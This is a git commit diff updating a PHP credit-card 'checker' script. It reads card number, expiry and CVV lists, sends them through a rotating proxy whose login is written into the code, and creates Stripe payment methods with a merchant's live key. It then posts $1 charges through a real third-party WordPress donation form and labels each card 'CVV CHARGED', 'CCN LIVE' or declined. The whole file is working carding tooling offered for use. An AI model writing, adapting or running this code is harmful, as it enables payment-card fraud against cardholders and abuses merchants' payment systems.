f6141f73773c1852c001f7153469b290e81050f8
GlooSmoke <147390858+GlooSmoke@users.noreply.github.com>
2024-06-11 09:29:30 +0700

    Update chk.php

--- chk.php
+++ chk.php
@@ -10,22 +10,26 @@ if ($_SERVER['REQUEST_METHOD'] == "POST") {
 } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
     extract($_GET);
 }
+
 function GetStr($string, $start, $end) {
     $str = explode($start, $string);
     $str = explode($end, $str[1]);  
     return $str[0];
 }
+
 function inStr($string, $start, $end, $value) {
     $str = explode($start, $string);
     $str = explode($end, $str[$value]);
     return $str[0];
 }
+
 $separa = explode("|", $lista);
 $cc = $separa[0];
 $mes = $separa[1];
 $ano = $separa[2];
 $cvv = $separa[3];
 
+/* Existing proxy.txt functionality disabled
 function rebootproxys()
 {
   $poxySocks = file("proxy.txt");
@@ -34,6 +38,38 @@ function rebootproxys()
   return $poxySocks;
 }
 $poxySocks4 = rebootproxys();
+*/
+
+$auth = "gloosmoke11-rotate:gloosmoke";
+$ip = "p.webshare.io:80";
+$proxy = $ip;
+$proxyauth = $auth;
+$url = 'http://api.ipify.org/';
+
+// Initialize cURL session
+$ch = curl_init();
+
+// Set cURL options
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+
+// Execute the cURL request and get the response
+$response = curl_exec($ch);
+
+// Check for cURL errors
+if(curl_errno($ch)) {
+    echo 'Curl error: ' . curl_error($ch);
+} else {
+    // Print the IP address
+    echo 'IP Address: ' . $response;
+}
+
+// Close the cURL session
+curl_close($ch);
 
 $number1 = substr($ccn,0,4);
 $number2 = substr($ccn,4,4);
@@ -41,16 +77,15 @@ $number3 = substr($ccn,8,4);
 $number4 = substr($ccn,12,4);
 $number6 = substr($ccn,0,6);
 
-function value($str,$find_start,$find_end)
-{
+function value($str,$find_start,$find_end) {
     $start = @strpos($str,$find_start);
-    if ($start === false) 
-    {
+    if ($start === false) {
         return "";
     }
     $length = strlen($find_start);
-    $end    = strpos(substr($str,$start +$length),$find_end);
+    $end = strpos(substr($str,$start +$length),$find_end);
     return trim(substr($str,$start +$length,$end));
+
 }
 
 function mod($dividendo,$divisor)
@@ -60,8 +95,10 @@ function mod($dividendo,$divisor)
 
 ////////////////////////////===[1 Req]
 
-set_time_limit(0);
 $ch = curl_init();
+curl_setopt($ch, CURLOPT_URL,$url);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
@@ -87,17 +124,20 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 ////////////////////////////===[1 Req Postfields]
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&key=pk_live_51OcW1ZHn9aam2LnOovdCzNOxhZ2MODSGMIa6rASbULadOkAKW2bjixaUFRiDH3RpWRA3Pbw1ND80Kx8IRfRwb2sC0052hhp8Zk');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&key=pk_live_51GSlEwFYWyXSCMPI20lU7U0S0GrYvvmkOSX6i53vXivz6d5uhEI7oLCrD46hIFH8eb4GN3BUbG4JPw8YYoVdwTkS00ljIlfNnc');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
+curl_close($ch);
 sleep(10);
 
 ////////////////////////////===[2 Req]
 
-set_time_limit(0);
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://marthahealthsolutions.com/wp-admin/admin-ajax.php?t=1716440395318');
+curl_setopt($ch, CURLOPT_URL,$url);
+curl_setopt($ch, CURLOPT_PROXY, $proxy);
+curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
+curl_setopt($ch, CURLOPT_URL, 'https://osiriuniversity.org/wp-admin/admin-ajax.php?t=1717189125159');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -108,36 +148,41 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'POST /wp-admin/admin-ajax.php?t=1716440395318 HTTP/1.1',
-'Host: marthahealthsolutions.com',
-'Accept: */*',
-'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
-'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-'Origin: https://marthahealthsolutions.com',
-'Sec-Fetch-Site: same-origin',
-'Sec-Fetch-Mode: cors',
-'Sec-Fetch-Dest: empty',
-'Referer: https://marthahealthsolutions.com/payment-proceed/',
-'Accept-Language: en-US,en;q=0.9',
+'POST /wp-admin/admin-ajax.php?t=1717189125159 h2',
+'Host: osiriuniversity.org',
+'accept: */*',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+'origin: https://osiriuniversity.org',
+'sec-fetch-site: same-origin',
+'sec-fetch-mode: cors',
+'sec-fetch-dest: empty',
+'referer: https://osiriuniversity.org/pay/',
+'accept-language: en-US,en;q=0.9',
 ));
 
 ////////////////////////////===[2 Req Postfields]////////////////////////////
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D405%26_fluentform_3_fluentformnonce%3D5914def0aa%26_wp_http_referer%3D%252Fpayment-proceed%252F%26names%255Bfirst_name%255D%3D%26numeric-field%3D%26address_1%255Baddress_line_1%255D%3D%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3D%26address_1%255Bstate%255D%3D%26address_1%255Bzip%255D%3D%26address_1%255Bcountry%255D%3D%26email%3D%26phone%3D%26datetime%3D23%252F05%252F2024%26custom-payment-amount%3D1%26numeric-field_1%3D%26description%3D%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D44349%26_fluentform_46_fluentformnonce%3D50a1655de3%26_wp_http_referer%3D%252Fpay%252F%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26email%3Dgloosmoke%2540gmail.com%26custom-payment-amount%3D1%26payment_method_1%3Dstripe%26input_text%3D%26__entry_intermediate_hash%3D0dc5cbb25e7222b1bba6b7b29c9ddbad%26item__46__fluent_checkme_%3D%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=46');
 
 $result2 = curl_exec($ch);
+curl_close($ch);
 sleep(10);
 
 ////////////////////////////===[Responses CVV]===////////////////////////////
 
-set_time_limit(0);
 if
-(strpos($result2,  'Thank you for your Payment.')) {
+(strpos($result2,  'Thank you!')) {
   echo "<font size=2 color='red'>  <font class='badge badge-dark'>🔥 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CVV CHARGED 1$ 🔥</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
 }
 
 elseif
 (strpos($result2,  'security code is incorrect')) {
+  echo "<font size=2 color='red'>  <font class='badge badge-dark'>✅ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
+}
+
+elseif
+(strpos($result2,  'security code is invalid')) {
   echo "<font size=2 color='red'>  <font class='badge badge-dark'>✅ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
 }
 
@@ -149,7 +194,6 @@ elseif
 else {
   echo "<font size=2 color='red'>  <font class='badge badge-danger'>❌ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Result: GENERIC DECLINED ❌ </i></font><br>";
 }
-sleep(10);
 
 curl_close($ch);
 ob_flush();
